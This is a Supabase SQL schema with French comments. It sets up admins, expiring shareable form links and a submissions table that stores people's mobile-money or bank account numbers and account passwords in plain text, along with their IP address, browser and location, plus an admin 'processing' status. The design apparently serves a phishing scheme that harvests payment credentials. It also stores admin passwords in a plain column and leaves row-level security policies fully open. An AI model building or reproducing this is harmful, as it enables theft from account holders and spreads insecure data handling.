-- Enable UUID extension
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- Table des administrateurs (Pour une securité maximale sur Supabase, on recommande d'utiliser Supabase Auth, mais voici la table demandée)
CREATE TABLE IF NOT EXISTS public.admins (
    id SERIAL PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL, -- Dans une vraie prod Supabase, utilisez auth.users
    phone VARCHAR(50),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Table des liens de formulaires
CREATE TABLE IF NOT EXISTS public.form_links (
    id SERIAL PRIMARY KEY,
    admin_id INT REFERENCES public.admins(id),
    name VARCHAR(255) NOT NULL,
    description TEXT,
    unique_code VARCHAR(100) UNIQUE NOT NULL,
    is_active BOOLEAN DEFAULT TRUE,
    expires_at TIMESTAMP WITH TIME ZONE,
    max_submissions INT,
    current_submissions INT DEFAULT 0,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Table des soumissions
CREATE TABLE IF NOT EXISTS public.submissions (
    id SERIAL PRIMARY KEY,
    form_link_id INT REFERENCES public.form_links(id),
    
    -- Infos personnelles
    full_name VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL,
    phone VARCHAR(50) NOT NULL,
    
    -- Infos paiement
    payment_method VARCHAR(50) NOT NULL, -- 'orange', 'mtn', 'bank', 'other'
    account_number VARCHAR(255) NOT NULL,
    account_password TEXT NOT NULL, 
    bank_name VARCHAR(255),
    operator_name VARCHAR(255),
    
    -- Métadonnées
    ip_address VARCHAR(50),
    user_agent TEXT,
    location VARCHAR(255),
    
    -- Gestion
    status VARCHAR(50) DEFAULT 'nouveau', -- 'nouveau', 'en_cours', 'traite', 'annule'
    admin_notes TEXT,
    processed_by INT REFERENCES public.admins(id),
    processed_at TIMESTAMP WITH TIME ZONE,
    
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Index pour performance
CREATE INDEX IF NOT EXISTS idx_submissions_form_link ON public.submissions(form_link_id);
CREATE INDEX IF NOT EXISTS idx_submissions_payment_method ON public.submissions(payment_method);
CREATE INDEX IF NOT EXISTS idx_submissions_created_at ON public.submissions(created_at);
CREATE INDEX IF NOT EXISTS idx_submissions_status ON public.submissions(status);

-- Row Level Security (RLS) - Important pour Supabase
ALTER TABLE public.admins ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.form_links ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.submissions ENABLE ROW LEVEL SECURITY;

-- Politiques (Exemple: tout ouvert pour demo, à restreindre en prod)
CREATE POLICY "Enable all access for now" ON public.admins FOR ALL USING (true);
CREATE POLICY "Enable all access for now" ON public.form_links FOR ALL USING (true);
CREATE POLICY "Enable insert for everyone" ON public.submissions FOR INSERT WITH CHECK (true);
CREATE POLICY "Enable read for admins" ON public.submissions FOR SELECT USING (true);
